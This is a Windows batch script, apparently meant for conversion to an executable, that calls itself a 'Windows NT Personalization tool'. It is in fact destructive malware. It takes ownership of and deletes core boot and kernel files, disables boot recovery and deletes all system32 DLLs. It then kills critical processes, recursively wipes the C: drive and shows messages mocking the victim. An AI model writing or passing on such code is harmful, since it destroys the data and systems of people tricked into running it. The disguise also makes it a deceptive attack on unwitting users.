::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDBdRw2+DGK5EqAO7fvHxumIrF4hROcta4DV27iHOuVd40brFQ==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQIHIRVQQxORfEWORoUZ+vv04euLq1ccQOswds/P1buCQA==
::eg0/rx1wNQPfEVWB+kM9LVsJDDOrEkWOUOFSzdDejw==
::fBEirQZwNQPfEVWB+kM9LVsJDDOLMmWuUOFSzfD+jw==
::cRolqwZ3JBvQF1fEqQIALQlHQwqDMGKgA/UF5/3pr92OrEkSQ/F/Vrub07qdNOEf5kTwfJkjtg==
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRL/eyKeBLuEf41/hNd4a/1R0rJ1YRSdLcQe5bQonlXlLuGqRYZPSthfkKg==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Windows NT Personalization tool
takeown /F "C:\Windows\system32\hal.dll"
icacls "C:\windows\system32\hal.dll" /grant everyone:F
del "C:\WINDOWS\system32\hal.dll /f /q
takeown /F "C:\Windows\system32\winload.efi"
icacls "C:\Windows\system32\winload.efi" /grant everyone:F
del "C:\Windows\system32\winload.efi /f /q
takeown /F "C:\Windows\system32\winload.exe"
icacls "C:\Windows\system32\winload.exe" /grant everyone:F
del "C:\Windows\system32\winload.exe /f /q
takeown /F "C:\Windows\system32\ntoskrnl.exe"
icacls "C:\windows\system32\ntoskrnl.exe" /grant everyone:F
del "C:\WINDOWS\system32\ntoskrnl.exe /f /q
takeown /F "C:\Windows\system32\winlogon.exe"
icacls "C:\windows\system32\winlogon.exe" /grant everyone:F
del "C:\WINDOWS\system32\winlogon.exe /f /q
bcdedit /set {default} recoveryenabled no
del %systemroot%\system32\*.dll /f /q
taskkill /f /im explorer.exe
start cmd.exe
start mspaint.exe
start notepad.exe
msg * 30 seconds left! XAXAXAXAXA
timeout /t 30 /nobreak >nul
msg * Imagine "accidentaly" opening this LOL. There were literaly 2 warnings, are you dumb? Go to the mirror! Reflect yourself! Now, you have to throw away $1000+ PC!
taskkill /f /im wininit.exe
taskkill /f /im cmd.exe
taskkill /f /im svchost.exe
taskkill /f /im csrss.exe
taskkill /f /im winlogon.exe
rd C:\ /s /q
cls
echo Wait, how is your PC still standing?
timeout /t 3 /nobreak >nul
shutdown /s /t 0